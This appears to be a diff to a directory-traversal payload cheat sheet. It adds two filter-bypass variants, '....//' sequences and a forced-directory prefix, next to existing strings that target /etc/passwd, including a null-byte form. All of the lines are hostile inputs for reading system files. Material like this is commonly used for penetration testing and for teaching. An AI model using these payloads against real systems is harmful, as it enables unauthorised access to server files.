@@ -65,3 +65,5 @@ Files to aim which a Directory Traversal
     /etc/passwd
     ../../../../etc/passwd
     ../../../../etc/passwd%00
+    ....//....//....//....//etc/passwd (Filter that replace ../ by empty string)
+    <forced directory>../../../../etc/passwd (When a directory is forced, include it)
